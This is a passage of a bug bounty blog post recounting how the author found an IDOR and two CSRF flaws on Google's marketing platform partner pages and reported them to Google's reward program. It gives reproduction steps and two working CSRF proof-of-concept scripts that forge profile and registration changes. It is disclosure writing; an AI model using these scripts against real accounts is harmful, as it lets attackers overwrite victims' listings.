+     style="display:block"
+     data-ad-client="ca-pub-6286056471796598"
+     data-ad-slot="6403910990"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+<h3>Aim The Target</h3>
+<p>After that, I decided to take a look deeper into the subdomain(marketingplatform.google.com). And there&#8217;s some register page to become Google Partner. Idk the detail, In short, we can post our company on that site. I take a look at the feature on the website and try to understand the flow, register as usual <strong>(with including XSS payload of course)</strong> with some hope it&#8217;ll be pop up on some page. Take a look the payload XSS has just become Text! 🙁</p>
+<p>Okay, XSS isn&#8217;t working on there, let&#8217;s move to take a look another basic vulnerability, try the <strong>IDOR or Broken Access Control</strong>, let&#8217;s change the ID! But wait, it&#8217;s a lot ID to change, I exactly don&#8217;t know what ID to change :(. Let just request another request on other accounts and see the different ID on both requests!</p>
+<h3>Get Some Clue!</h3>
+<p>After some take a look at both request deeper, I realize if there&#8217;s some different ID and 4 in total, and the ID is exactly on the referer. I assume the ID is reflected from the ID on the public URL. But there&#8217;s some ID it&#8217;s totally different, it&#8217;s taken me time to think where the ID comes from, and then I decided to just delete it and see what happened when I send the request after changing the ID!</p>
+<div class='code-block code-block-2' style='margin: 8px auto; text-align: center; display: block; clear: both;'>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Adsense 1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6286056471796598"
+     data-ad-slot="6403910990"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+<h3>IDOR on Edit Profile!</h3>
+<p>After the deleted the ID where I don&#8217;t know the ID come from, I send the request and just return <strong>[1] </strong>on the response. Hmmm, Okay! Let&#8217;s reload the victim profile. When I reload the victim profile, it&#8217;s just changed to data I send it before! It means IDOR right! After double-check it, I can confirm it&#8217;s and IDOR. So, this is the POC for this :</p>
+<h4>IDOR Step To Reproduce :</h4>
+<ol>
+<li>Go to https://marketingplatform.google.com/about/partners/create-listing, register as a partner and go to &#8220;edit listing&#8221;</li>
+<li>Intercept the request via burp</li>
+<li>Change the ID on burp with another user ID</li>
+<li>Make sure the third user ID is applying on the right parameter, and delete the last parameter ID in the end.</li>
+</ol>
+<figure id="attachment_428" aria-describedby="caption-attachment-428" style="width: 632px" class="wp-caption alignnone"><img decoding="async" class="wp-image-428 size-full" src="https://apapedulimu.click/wp-content/uploads/2020/07/Screen-Shot-2020-02-07-at-10.52.37.png" alt="Vulnerable IDOR Request" width="632" height="649" srcset="https://apapedulimu.click/wp-content/uploads/2020/07/Screen-Shot-2020-02-07-at-10.52.37.png 632w, https://apapedulimu.click/wp-content/uploads/2020/07/Screen-Shot-2020-02-07-at-10.52.37-292x300.png 292w" sizes="(max-width: 632px) 100vw, 632px" /><figcaption id="caption-attachment-428" class="wp-caption-text">Vulnerable IDOR Request</figcaption></figure>
+<p><strong>Video: </strong></p>
+<p>https://youtu.be/JDwJa9P4xos</p>
+<p>After I confirm the IDOR I quickly make a report and send it to Google VRP!</p>
+<h3>CSRF on Edit Profile!</h3>
+<p>IDOR report has been sent, and then I am trying to relax and keep in my mind if the IDOR might be duplicate. So, never celebrate too early. After some relax and enjoy my<strong> Kapal Api</strong> <strong>Coffee</strong>. I try to take a look at my burp history, do something interesting happened when I&#8217;m not aware of it?</p>
+<p>After some take a look at my burp history, I realize if the Edit Profile Request doesn&#8217;t contain any CSRF token, it&#8217;s mean the endpoint is also vulnerable with CSRF Attack? Since the required ID is can be accessed publicly, the attacker can be gain the ID of the victim and send malicious links who contain CSRF Attack to the victim!</p>
+<p>I quickly try to reproduce the CSRF Attack to confirm the endpoint is vulnerable with CSRF Attack, I use this script :</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="html">&lt;title&gt;CSRF on Marketing Platform Google&lt;/title&gt;
+
+//parameter ID : https://marketingplatform.google.com/about/partners/company/5148764629106688/gacp/5139310734999552/service/5199468395757568
+
+&lt;script&gt;
+function getMe(){
+// retrieve page content
+var xhr = new XMLHttpRequest();
+// now execute the CSRF attack
+xhr.open("POST",
+"https://marketingplatform.google.com/about/partners/services/listing/save", true);
+xhr.withCredentials="true";
+
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+xhr.send('[[["first-parameter",[null,"hacked by hacker ","merauke","1231231",null,"AS","-8.4991117,140.4049814","hacker@gmail.com","0831231911"],null,[null,null,"victim","https://hacker.com",null,null,"hacked by hackerr ",null,null,null,null,null,null,null,null,null,null,null,null,null,""],null,null,[null,"hacked by hackerr ","hacked by hackerr","hacker@gmail.com","08318273191"],null,null,[]],[null,null,null,[null,null,"Full-Service Digital",null,null,[],["Large Business"],null,null,"",null,[],null,[],null,null,"third-parameter"],[],[],[],[],null,null,null,[],[],"second-parameter",[[null,"hacked by hackerr","hacked by hackerr","123151",null,"DZ","-8.4991117,140.4049814","victim@gmail.com","08310293801",true,null,null,null]]]]]');
+}
+&lt;/script&gt;&lt;center&gt;
+&lt;h1&gt;CSRF To Edit Profile&lt;/h1&gt;
+&lt;button onclick="getMe();"&gt;Xploit Kuyy&lt;/button&gt;
+&lt;/center&gt;</pre>
+<p>I successfully perform the CSRF Attack on that endpoint with this Step To Reproduce:</p>
+<p><strong>Steps to reproduce:</strong></p>
+<ol>
+<li>Save the ID and edit the parameter with the parameter of victim company and save .html</li>
+<li>Click the exploit.</li>
+<li>The Profile will be changed</li>
+</ol>
+<p>Yes! I Confirm if the CSRF Attack is possible and quickly report them to Google VRP.</p>
+<p>But wait, since I reported the IDOR issue first The VRP Team believes if the IDOR fix might also fix the CSRF vulnerability. So, to get the &#8220;Nice Catch&#8221; email, I must wait for the IDOR issue fixed first, and then if the CSRF still exists, I will get the &#8220;Nice Catch&#8221; Email! Fair enough.</p>
+<div class='code-block code-block-2' style='margin: 8px auto; text-align: center; display: block; clear: both;'>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Adsense 1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6286056471796598"
+     data-ad-slot="6403910990"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+<h3>And Another CSRF on Register Page!</h3>
+<p>After found CSRF on edit profile I started to focus to find another CSRF, I double-checks burp history to find request without any CSRF Token / CSRF Protection. And then I found the CSRF at the beginning I hunt on that subdomain. The Register page! I try to make simple script to reproduce CSRF. The script is like this :</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;title&gt;CSRF on Marketing Platform Google&lt;/title&gt;
+&lt;script&gt;
+function getMe(){
+// retrieve page content
+var xhr = new XMLHttpRequest();
+// now execute the CSRF attack
+xhr.open("POST",
+"https://marketingplatform.google.com/about/partners/services/become_gacp/create_company", true);
+xhr.withCredentials="true";
+
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+xhr.send('["","Hacked By Hacker!!!!!!!!","400","ID"]');
+}
+&lt;/script&gt;&lt;center&gt;
+&lt;h1&gt;CSRF To Overwrite Current Register Data&lt;/h1&gt;
+&lt;button onclick="getMe();"&gt;Xploit Kuyy&lt;/button&gt;
+&lt;/center&gt;</pre>
+<p>Sure, the endpoint is vulnerable with CSRF Attack. But, what is the impact? And it&#8217;s just register page, right? After some take a look on the subdomain, I realize if user can register a new company while he has done the register and the latest data can be overwrite by a new data. So, the attacker can trick the victim when victim register his company and under review by the Google Team, attacker can launch the CSRF Attack at his company and the data who not yet review will overwrite with a new data.</p>
+<p>Okay! So, this is the Step To Reproduce :</p>
+<ol>
+<li>Register your account to partner on https://marketingplatform.google.com/about/partners/create-listing and go to your profile ( click view draft )</li>
+<li>Go to https://labs.apapedulimu.click/exploit/google/csrf-register-marketingplatform.html ( I&#8217;ve made the script to perform CSRF )</li>
+<li>Refresh your profile, your profile name will change to &#8220;Hacked By Hacker!!!! &#8220;</li>
+</ol>
+<p>After that, I quickly sent the report to Google VRP!</p>
+<h3>Timeline :</h3>
+<ul>
+<li><strong>Feb 7, 2020</strong> &#8211; Reported IDOR</li>
+<li><strong>Feb 8, 2020</strong> &#8211; Reported CSRF (Register Page)</li>
+<li><strong>Feb 15, 2020</strong> &#8211; Nice Catch! IDOR</li>
+<li><strong>Feb 15, 2020</strong> &#8211; Nice Catch! CSRF</li>
+<li><strong>Feb 16, 2020</strong> &#8211; Reported Another CSRF ( Edit Profile )</li>
+<li><strong>Feb 21, 2020</strong> &#8211; Make a deal on CSRF ( Wait until IDOR Fixed )  to get &#8220;Nice Catch&#8221;</li>
+<li><strong>Mar 4, 2020</strong> &#8211; Awarded 3,133.70 ( IDOR )</li>
+<li><strong>Mar 4, 2020</strong> &#8211; Awarded 500 ( CSRF on Register PAge )</li>
+<li><strong>Mar 14, 2020</strong> &#8211; Fixed ( CSRF on Register Page &amp; IDOR on Edit Profile )</li>
+<li><strong>Mar 14, 2020</strong> &#8211; Follow Up The CSRF on Edit Profile ( Still vulnerable )</li>
+<li><strong>Mar 31, 2020</strong> &#8211; Nice Catch!</li>
+<li><strong>Apr 14, 2020</strong> &#8211; Awarded 500 (CSRF on Edit Profile)</li>
+<li><strong>May 2, 2021 </strong>&#8211; Marked as Won&#8217;t Fix (CSRF on Edit Profile)</li>
+</ul>
+<div class='code-block code-block-2' style='margin: 8px auto; text-align: center; display: block; clear: both;'>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Adsense 1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6286056471796598"
+     data-ad-slot="6403910990"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+<!-- CONTENT END 1 -->
+	</div><!-- .entry-content -->
+
+	
+<div class="author-info">
+	<h2 class="author-heading">Published by</h2>
+	<div class="author-avatar">
+		<img alt='' src='https://secure.gravatar.com/avatar/721632c10cec94b08f029c20f41d3122?s=56&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/721632c10cec94b08f029c20f41d3122?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' decoding='async'/>	</div><!-- .author-avatar -->
+
+	<div class="author-description">
+		<h3 class="author-title">apapedulimu</h3>
+
+		<p class="author-bio">
+			Urip Kui Urup			<a class="author-link" href="https://apapedulimu.click/author/apapedulimu/" rel="author">
+				View all posts by apapedulimu			</a>
+		</p><!-- .author-bio -->
+
+	</div><!-- .author-description -->
+</div><!-- .author-info -->
+
+	<footer class="entry-footer">
+		<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="https://apapedulimu.click/story-of-idor-on-google-product/" rel="bookmark"><time class="entry-date published" datetime="2021-09-06T01:15:43+00:00">September 6, 2021</time><time class="updated" datetime="2021-09-06T14:40:13+00:00">September 6, 2021</time></a></span><span class="byline"><span class="screen-reader-text">Author </span><span class="author vcard"><a class="url fn n" href="https://apapedulimu.click/author/apapedulimu/">apapedulimu</a></span></span><span class="tags-links"><span class="screen-reader-text">Tags </span><a href="https://apapedulimu.click/tag/bug-bounty/" rel="tag">Bug Bounty</a>, <a href="https://apapedulimu.click/tag/csrf/" rel="tag">CSRF</a>, <a href="https://apapedulimu.click/tag/google/" rel="tag">Google</a>, <a href="https://apapedulimu.click/tag/idor/" rel="tag">IDOR</a></span>			</footer><!-- .entry-footer -->
+
+</article><!-- #post-399 -->
+
+<div id="comments" class="comments-area">
+
+	
+	
+		<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/story-of-idor-on-google-product/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://apapedulimu.click/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message">Required fields are marked <span class="required">*</span></span></p><p class="comment-form-comment"><label for="comment">Comment <span class="required">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" autocomplete="name" required /></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" autocomplete="email" required /></p>
+<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" autocomplete="url" /></p>
+<p class="comment-subscription-form"><input type="checkbox" name="subscribe_comments" id="subscribe_comments" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-label" for="subscribe_comments">Notify me of follow-up comments by email.</label></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_blog" id="subscribe_blog" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-blog-label" for="subscribe_blog">Notify me of new posts by email.</label></p><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='399' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="8f6f25db6a" /></p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="35"/><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
+	
+</div><!-- .comments-area -->
+
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://apapedulimu.click/google-vrp-how-i-get-blind-xss-at-google-with-dork-first-bounty-and-hof/" rel="prev"><span class="meta-nav" aria-hidden="true">Previous</span> <span class="screen-reader-text">Previous post:</span> <span class="post-title">[Google VRP] How I Get Blind XSS At Google With Dork (First Bounty and HOF )</span></a></div><div class="nav-next"><a href="https://apapedulimu.click/idor-on-apple/" rel="next"><span class="meta-nav" aria-hidden="true">Next</span> <span class="screen-reader-text">Next post:</span> <span class="post-title">7,500$ &#8211; IDOR on Apple [consultants.apple.com]</span></a></div></div>
+	</nav>
+		</main><!-- .site-main -->
+	</div><!-- .content-area -->
+
+
+	</div><!-- .site-content -->
+
+	<footer id="colophon" class="site-footer">
+		<div class="site-info">
+									<a href="https://wordpress.org/" class="imprint">
+				Proudly powered by WordPress			</a>
+		</div><!-- .site-info -->
+	</footer><!-- .site-footer -->
+
+</div><!-- .site -->
+
+	<div style="display:none">
+			<div class="grofile-hash-map-721632c10cec94b08f029c20f41d3122">
+		</div>
+		</div>
+		<script src="https://apapedulimu.click/wp-includes/js/comment-reply.min.js?ver=6.7.1" id="comment-reply-js" async data-wp-strategy="async"></script>
+<script src="https://apapedulimu.click/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=zFT7OeexxixNfMD" id="enlighterjs-js"></script>
+<script id="enlighterjs-js-after">
+!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":true,"theme":"enlighter","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
+</script>
+<script src="https://stats.wp.com/e-202502.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
+<script id="jetpack-stats-js-after">
+_stq = window._stq || [];
+_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"157205012\",\"post\":\"399\",\"tz\":\"0\",\"srv\":\"apapedulimu.click\",\"j\":\"1:14.2.1\"}") ]);
+_stq.push([ "clickTrackerInit", "157205012", "399" ]);
+</script>
+<script defer src="https://apapedulimu.click/wp-content/plugins/akismet/_inc/akismet-frontend.js?ver=1704811922" id="akismet-frontend-js"></script>
+
+</body>
+</html>
+
+
+<!-- Page supported by LiteSpeed Cache 6.5.4 on 2025-01-11 07:35:57 -->
